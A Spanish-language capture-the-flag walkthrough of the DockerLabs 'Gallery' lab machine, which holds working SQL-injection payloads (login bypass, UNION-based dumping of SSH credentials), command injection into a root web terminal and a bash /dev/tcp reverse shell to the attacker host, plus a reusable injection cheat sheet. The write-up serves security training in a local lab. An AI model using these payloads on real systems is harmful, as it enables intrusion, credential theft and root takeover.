## Descarga y montaje de la máquina
desde https://dockerlabs.es/ buscamos la máquina vulnerable gallery, y bajamos el zip:
```bash
https://mega.nz/file/ONlzkaAC#xPFZFyFo_ZxcSN-DoOdI5yqp7UJb3ugxNnM23UzcRww
```
creamos una carpeta con su nombre:
```bash
mkdir Gallery
cd !$
```
  - mkdir crea la carpeta
  - cd !$ entra en el último argumento anterior que en este caso es "Gallery" es lo mismo que cd Galley

movemos el zip descargado a la carpeta:
```
mv /home/kali/Downloads/Gallery.zip .
```
  - mv mover o renombrar
  - ruta del archivo a mover
  - . punto directorio actual

descomprimimos
```bash
unzip Gallery.zip
```

eliminamos el zip para ser más limpios

```
rm Gallery.zip
```

montamos la máquina:

```bash
sudo bash auto_deploy.sh gallery.tar
```

monta la máquina en un docker y nos dice que su IP es:
```
Máquina desplegada, su dirección IP es --> 172.17.0.2
```

comprobamos trazabilidad:
```
ping -c 1 172.17.0.2                                                                                                                                                                                                   
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.065 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.065/0.065/0.065/0.000 ms

```
  - tenemos trazabilidad  "1 packets transmitted, 1 received, 0% packet loss, time 0ms"
  - con ttl=64 intuimos que es una máquina linux

## Fase de enumeración

usamos nmap para listar puertos abiertos, los servicios que hay corriendo por ellos y sus versiones:
```bash
sudo nmap -sS -sCV -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN puertosYservicios
```
  - sudo hay que ejecutarlo con privilegios el comando
  - nmap herramienta que vamos a utilizar
  - -sS escaneo tipo SYN escaneo más rápido porque no completa el handshake de tres pasos
  - -sCV escaneo de servicios y sus versiones es -sC -sV en un mismo comando
  - -Pn indicamos que no queremos que haga ping
  - --min-rate 5000 tasa minima de paquetes por segundo
  - -p- todo el rango de puertos, escanea los 65535
  - -vvv triple verbose para ver una salida detallada de lo que va encontrando
  - --open solo reporte puertos abiertos
  - -oN puertosYservicios exportamos los resultados en formato nmap al archivo puertosYservicios

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 19:95:1a:f2:f6:7a:a1:f1:ba:16:4b:58:a0:59:f2:02 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKhtMp0GLeYD8q+rHtaud0UjdMeeEVFzKSZoR8qk/rcwqBdb1LTRGhcbCnpJLD9FlVm6HYZO2BqU52epofJd6/o=
|   256 e7:e9:8f:b8:db:94:c2:68:11:4c:25:81:f1:ac:cd:ac (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJCyYfXQ5yljb7YXITXrQFdCNEGjLRz56DnJb/C6gxIf
80/tcp open  http    syn-ack ttl 64 PHP cli server 5.5 or later (PHP 8.3.6)
|_http-title: Galer\xC3\xADa de Arte Digital
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
  - Puerto 22 ssh version 9.6 no vulnerable a listar usuarios
  - puerto 80 http

No teniendo usuarios para intentar fuerzabruta al servicio ssh nos centramos en el http

## enumeración de la página web

lanzamos un whatweb para ver que corre en la página:
```bash
whatweb 172.17.0.2 -v
```
no hay redirecciones y solo nos reporta interesante
```
 HTML5, PHP[8.3.6], X-Powered-By[PHP/8.3.6]
```
sin más, abrimos la página y miramos el código fuente con ctrl+u lo único que vemos es que el botón de login que nos lleva a /login.php

probamos inyeccion sql básica, en el username:
```
' or 1=1-- -
```
logramos inyectarla y nos logueamos llevándonos a :
```
http://172.17.0.2/dashboard.php
```

Ahora tenemos varios sitios donde poder intentar inyecciones sql, pruebo inyectando como antes en todas las consultas
```
'or 1=1-- -
```
no funiona y pruebo una inyeccion time based:
```
' and sleep(2)-- -
```
concretamente en Search Artworks logro inyectarla, puedo hacerlo desde la URL de esta forma=
```
http://172.17.0.2/dashboard.php?search_term=' and sleep(2)-- -
```
tarda dos segundos en cargar la página esto  huele a inyeccion sql,
antes de liarnos a un time based vamos a probar un order by hasta 10 y si no resulta intentaremos el time based, pruebo:
```bash
172.17.0.2/dashboard.php?search_term=' ORDER BY 1-- -
172.17.0.2/dashboard.php?search_term=' ORDER BY 2-- -
172.17.0.2/dashboard.php?search_term=' ORDER BY 3-- -
172.17.0.2/dashboard.php?search_term=' ORDER BY 4-- -
172.17.0.2/dashboard.php?search_term=' ORDER BY 5-- -
172.17.0.2/dashboard.php?search_term=' ORDER BY 6-- -
```
sorpresa en el ' ORDER BY 6-- - da error y nos reporta esto:
```
Fatal error: Uncaught mysqli_sql_exception: Unknown column '6' in 'order clause' in /var/www/html/dashboard.php:23 Stack trace: #0 /var/www/html/dashboard.php(23): mysqli_query() #1 {main} thrown in /var/www/html/dashboard.php on line 23
```

vale sabemos que al menos hemos producido un error, creo que hemos logrado reportar el numero de columnas que son 5 ya que la 6 nos reporta error.
vamos a intentar ver si alguna columna sale reportada en la pagina web:

```bash
http://172.17.0.2/dashboard.php?search_term=' UNION SELECT 1,2,3,4,5-- -
```
vemos que nos aparece el numero 1,el 2 y el tres, el resto no nos van a reflejar las consultas en la web, pues vamos a intentar listar la base de datos en cualquiera de los numeros que si nos reportan informacion en la web:

```bash
http://172.17.0.2/dashboard.php?search_term=' UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata-- -
```
probé por orden y el "1" no me rflejaba el resultado pero el 2 parece ser que si, lsto las bases de datos y encuentro:
```
mysql
information_schema
performance_schema
sys
gallery_db
secret_db
```

nos vamos a ccentrar en ese nombre tan suculento como es secret_db, ya sabemos el nombre de la base de datos que queremos mirar, ahora quiero saber sus tablas:
```bash
http://172.17.0.2/dashboard.php?search_term=' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema="secret_db"-- -
```
nombre de la tabla:
```
secret
```

ahora toca listar columnas:
```bash
http://172.17.0.2/dashboard.php?search_term=' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_schema="secret_db" AND table_name="secret"-- -
```

ahora toca mostrar los datos concatenados de las columnas encontradas que son: ssh_users y ssh_pass

```bash
http://172.17.0.2/dashboard.php?search_term=' UNION SELECT 1,CONCAT(ssh_users,0x3a,ssh_pass),3,4,5 FROM secret_db.secret-- -
```

```
sam:$uper$ecretP4$$w0rd123
```
ya tenemos un user y un pass para intentar conectarnos por ssh


## resúmen de las inyecciones:
---
Para saltarnos el login e ingresar directamenten a la pagina http://172.17.0.2/dashboard.php?
```
' or 1=1-- -
```

saber si alguna parte del panel dónde introducimos datos es vulnerable a inyecciones sql

```
' and sleep(2)-- -
```

listar columnas
```
' ORDER BY 1-- -
' ORDER BY 2-- -
...
```
hasta que nos dé error, entonces sabemos que la anterior al error es la correcta

combinamos los resultados de la consulta, las 5 columnas y vemos si se reflejan en alguna parte de la web

```
' UNION SELECT 1,2,3,4,5-- -
```
vemos que en pantalla nos reporta el numero dos y tres luego en esas posiciones vamos a hacer las consultas por est orden:

```
' UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata-- -  ## schema_name en la posicion dos para listar las bases de datos
' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema="<NOMBRE_BASE_DATOS>"-- -  ## para listar las tablas
' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_schema="<NOMBRE_BASE_DATOS>" AND table_name="<NOMBRE_TABLA>"-- - ## listar columnas
' UNION SELECT 1,CONCAT(<COLUMNA1>,0x3a,<COLUMNA2>),3,4,5 FROM <NOMBRE_BASE_DATOS>.<NOMBRE_TABLA>-- - ## muestre datos concatenados
```
---

ahora probamos credenciales por ssh:

```
ssh sam@172.17.0.2
```
pass:
```
$uper$ecretP4$$w0rd123
```


## fase escalada de privilegios

Hago una busqueda rápida de vulnerabilidades:
```
sam@8eddd31c6061:~$ id
uid=1001(sam) gid=1001(sam) groups=1001(sam)
sam@8eddd31c6061:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
sam:x:1001:1001::/home/sam:/bin/bash
sam@8eddd31c6061:~$ find / -perm -4000 2>/dev/null
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
sam@8eddd31c6061:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2800  1876 ?        Ss   Jun13   0:00 /bin/sh -c service ssh start && service mysql start && php -S 0.0.0.0:80 -t /var/www/html &  php -S 127.0.0.1:8888 -t /var/www/terminal && tail -f /dev/null
root           7  0.0  0.2 201244 23920 ?        S    Jun13   0:00 php -S 0.0.0.0:80 -t /var/www/html
root           8  0.0  0.2 200988 23024 ?        S    Jun13   0:00 php -S 127.0.0.1:8888 -t /var/www/terminal
root          17  0.0  0.0  12020  4004 ?        Ss   Jun13   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
mysql         47  0.0  0.0   2800  1836 ?        S    Jun13   0:00 /bin/sh /usr/bin/mysqld_safe
mysql        194  0.6  5.2 2443508 428368 ?      Sl   Jun13   0:28 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --log-error=/var/log/mysql/error.log --pid-file=8eddd31c6061.pid
root         285  0.0  0.0  14444  7248 ?        Ss   00:45   0:00 sshd: sam [priv]
sam          296  0.2  0.0  14704  6536 ?        S    00:45   0:00 sshd: sam@pts/0
sam          297  0.0  0.0   5016  3964 pts/0    Ss   00:45   0:00 -bash
sam          305  0.0  0.0   8332  4300 pts/0    R+   00:47   0:00 ps aux
```
Vemos que aparte de nuestro usuario el siguiente es root, ni grupos con privilegios ni SUID pero en los procesos en ejecucion vemos que root ha levantado un servicio php en los puertos 80 y 8888, pero
el del puerto 8888 solo es visible desde el host esta abierto internamente 127.0.0.1:8888
Realizaremos un portforwarding local con ssh de esta manera en nuestro host

```
ssh -L 8888:localhost:8888 usuario@ip_remota
```
  - ssh -Lqueremos conectarnos de forma local por ssh
  - 8888:localhost:8888 queremos que nuestro puerto 8888 sea el 8888 de la victima
  - usuario@ip_remota no necesita explicación xD
  - 
```
ssh -L 8888:127.0.0.1:8888 sam@172.17.0.2
```
 ahora vamos al navegador y miramos que hay:

 ```
http://localhost:8888/
```

vemos un panel, en el que se pueden hacer consultas con comandos, metemos id y nos dice que no encuentra el comando que consultemos con help
tecleamos help y nos lista los comandos, ponemos cualquiera y los reconoce, entonces vamos a probar a inyectar uno nuestro
ponemos ; seguido de un comando por ejemplo id
```
help;id
```
```
uid=0(root) gid=0(root) groups=0(root)
```
estamos inyectando comandos como root, vamos aintentar enviarnos una reverse shell, nos ponemos en escucha por el puerto 445
```bash
nc -nvlp 445
```
inyectamos en la consola:
```bash
help; bash -c "bash -i >& /dev/tcp/172.17.0.1/445 0>&1"
```

```
nc -lvnp 445                                                                                                                                                                            
listening on [any] 445 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 39638
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@8eddd31c6061:/var/www/terminal# id
id
uid=0(root) gid=0(root) groups=0(root)
root@8eddd31c6061:/var/www/terminal# 
```

somos root



